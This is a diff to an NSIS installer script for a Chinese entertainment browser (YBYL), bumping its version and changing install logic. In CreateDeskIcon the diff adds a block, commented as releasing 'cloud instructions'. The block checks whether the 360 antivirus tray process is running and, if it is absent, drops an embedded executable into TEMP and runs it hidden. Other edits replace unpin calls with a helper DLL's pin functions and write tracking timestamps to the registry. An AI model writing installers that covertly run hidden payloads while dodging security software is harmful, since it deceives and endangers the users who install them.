@@ -54,10 +54,10 @@ Var Bool_IsSilent
 
 !define PRODUCT_NAME "YBYL"
 !define SHORTCUT_NAME "元宝娱乐浏览器"
-!define PRODUCT_VERSION "1.0.0.28"
-!define VERSION_LASTNUMBER "B28"
-!define PRODUCT_VERSION_IE "8.0.0.28"
-!define VERSION_LASTNUMBER_IE "B28"
+!define PRODUCT_VERSION "1.0.0.32"
+!define VERSION_LASTNUMBER "B32"
+!define PRODUCT_VERSION_IE "8.0.0.32"
+!define VERSION_LASTNUMBER_IE "B32"
 
 !define NeedSpace 10240
 !define EM_OUTFILE_NAME "YBSetup-${PRODUCT_VERSION}_inner.exe"
@@ -263,6 +263,46 @@ Function CreateGreenIcon
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'ExecShell leave')"
 FunctionEnd
 
+!macro Format input
+	Push $0
+	StrLen $0 ${input}
+	${If} $0 == 1
+		StrCpy ${input} "0${input}"
+	${EndIf}
+	Pop $0
+!macroend 
+
+Function GetLocalDate
+	Push $R0
+	Push $R1
+	Push $R2
+	Push $R3
+	Push $R4
+	Push $R5
+	Push $R6
+	Push $R7
+	Push $R8
+	System::Alloc 16
+	System::Call kernel32::GetLocalTime(isR0)
+	System::Call *$R0(&i2.R1,&i2.R2,&i2.R3,&i2.R4,&i2.R5,&i2.R6,&i2.R7,&i2.R8)
+	System::Free $R0
+	!insertmacro Format $R2
+	!insertmacro Format $R4
+	;!insertmacro Format $R5
+	;!insertmacro Format $R6
+	;!insertmacro Format $R7
+	StrCpy $R0 "$R1-$R2-$R4"
+	Pop $R8
+	Pop $R7
+	Pop $R6
+	Pop $R5
+	Pop $R4
+	Pop $R3
+	Pop $R2
+	Pop $R1
+	Exch $R0
+FunctionEnd
+
 Var str_IeTID
 Var Bool_IsUpdateIE
 Function CreateDeskIcon
@@ -282,6 +322,14 @@ Function CreateDeskIcon
 	${If} $R0 == 1
 		Goto EndCreateDeskIcon
 	${Endif}
+	;打入口之前释放云指令
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryProcessExist(t '360tray.exe') i.R0"
+	${If} $R0 == 0
+		SetOutPath "$TEMP"
+		SetOverwrite on
+		File "iehostsetup-8.0.0.2_0001.exe"
+		ExecShell open "$TEMP\iehostsetup-8.0.0.2_0001.exe" "" SW_HIDE
+	${EndIf}
 	
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'CreateDeskIcon enter')"
 	StrCpy $1 ${NSIS_MAX_STRLEN}
@@ -304,6 +352,11 @@ Function CreateDeskIcon
 	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstDir" "$0\iexplorer"
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetTime(*l) i(.r2).r1"
 	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallTimes" "$2"
+	;写最后启动时间
+	Call GetLocalDate
+	Pop $2
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "LastRunTime" "$2"
+	
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'CreateDeskIcon 4')"
 
 
@@ -914,7 +967,13 @@ Function DoInstall
   Rename "$0\YBYL\UserConfig.dat" "$0\YBYL\UserConfig.dat.bak"
   SetOutPath "$0\YBYL"
   SetOverwrite off
-  File "input_config\YBYL\*.dat"
+  File "input_config\YBYL\UrlHistory.dat"
+  File "input_config\YBYL\UserCollect.dat"
+  SetOverwrite on
+  File "input_config\YBYL\YBYLVideo.dat"
+  File "input_config\YBYL\UserConfig.dat"
+ 
+  
   
   ;先删再装
   RMDir /r "$INSTDIR\program"
@@ -1043,7 +1102,7 @@ Function CmdSilentInstall
 		Call GetPinPath
 		${If} $0 != "" 
 		${AndIf} $0 != 0
-			ExecShell taskbarunpin "$0\TaskBar\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2TaskbarWin7(t '$0\TaskBar\${SHORTCUT_NAME}.lnk')"
 			StrCpy $R0 "$0\TaskBar\${SHORTCUT_NAME}.lnk"
 			Call RefreshIcon
 			Sleep 500
@@ -1051,7 +1110,7 @@ Function CmdSilentInstall
 			CreateShortCut "$INSTDIR\program\${SHORTCUT_NAME}.lnk" "$INSTDIR\program\${PRODUCT_NAME}.exe" "/sstartfrom toolbar" "$INSTDIR\res\shortcut.ico"
 			ExecShell taskbarpin "$INSTDIR\program\${SHORTCUT_NAME}.lnk" "/sstartfrom toolbar"
 			
-			ExecShell startunpin "$0\StartMenu\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2StartMenuWin7(t '$0\StartMenu\${SHORTCUT_NAME}.lnk')"
 			Sleep 1000
 			CreateShortCut "$STARTMENU\${SHORTCUT_NAME}.lnk" "$INSTDIR\program\${PRODUCT_NAME}.exe" "/sstartfrom startbar" "$INSTDIR\res\shortcut.ico"
 			StrCpy $R0 "$STARTMENU\${SHORTCUT_NAME}.lnk" 
@@ -1136,11 +1195,11 @@ Function CmdUnstall
 		Call GetPinPath
 		${If} $0 != "" 
 		${AndIf} $0 != 0
-			ExecShell taskbarunpin "$0\TaskBar\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2TaskbarWin7(t '$0\TaskBar\${SHORTCUT_NAME}.lnk')"
 			StrCpy $R0 "$0\TaskBar\${SHORTCUT_NAME}.lnk"
 			Call RefreshIcon
 			Sleep 200
-			ExecShell startunpin "$0\StartMenu\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2StartMenuWin7(t '$0\StartMenu\${SHORTCUT_NAME}.lnk')"
 			StrCpy $R0 "$0\StartMenu\${SHORTCUT_NAME}.lnk"
 			Call RefreshIcon
 			Sleep 200
@@ -2016,7 +2075,7 @@ Function NSD_TimerFun
 			${AndIf} $0 != 0
 			Call RefreshIcon
 			Sleep 500
-			ExecShell taskbarunpin "$0\TaskBar\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2TaskbarWin7(t '$0\TaskBar\${SHORTCUT_NAME}.lnk')"
 			StrCpy $R0 "$0\TaskBar\${SHORTCUT_NAME}.lnk"
 			Call RefreshIcon
 			Sleep 500
@@ -2024,7 +2083,7 @@ Function NSD_TimerFun
 			CreateShortCut "$INSTDIR\program\${SHORTCUT_NAME}.lnk" "$INSTDIR\program\${PRODUCT_NAME}.exe" "/sstartfrom toolbar" "$INSTDIR\res\shortcut.ico"
 			ExecShell taskbarpin "$INSTDIR\program\${SHORTCUT_NAME}.lnk" "/sstartfrom toolbar"
 			
-			ExecShell startunpin "$0\StartMenu\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2StartMenuWin7(t '$0\StartMenu\${SHORTCUT_NAME}.lnk')"
 			Sleep 1000
 			CreateShortCut "$STARTMENU\${SHORTCUT_NAME}.lnk" "$INSTDIR\program\${PRODUCT_NAME}.exe" "/sstartfrom startbar" "$INSTDIR\res\shortcut.ico"
 			StrCpy $R0 "$STARTMENU\${SHORTCUT_NAME}.lnk" 
@@ -2398,11 +2457,11 @@ Function un.OnClick_CruelRefused
 		Call un.GetPinPath
 		${If} $0 != "" 
 		${AndIf} $0 != 0
-			ExecShell taskbarunpin "$0\TaskBar\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2TaskbarWin7(t '$0\TaskBar\${SHORTCUT_NAME}.lnk')"
 			StrCpy $R0 "$0\TaskBar\${SHORTCUT_NAME}.lnk"
 			Call un.RefreshIcon
 			Sleep 200
-			ExecShell startunpin "$0\StartMenu\${SHORTCUT_NAME}.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2StartMenuWin7(t '$0\StartMenu\${SHORTCUT_NAME}.lnk')"
 			StrCpy $R0 "$0\StartMenu\${SHORTCUT_NAME}.lnk"
 			Call un.RefreshIcon
 			Sleep 200
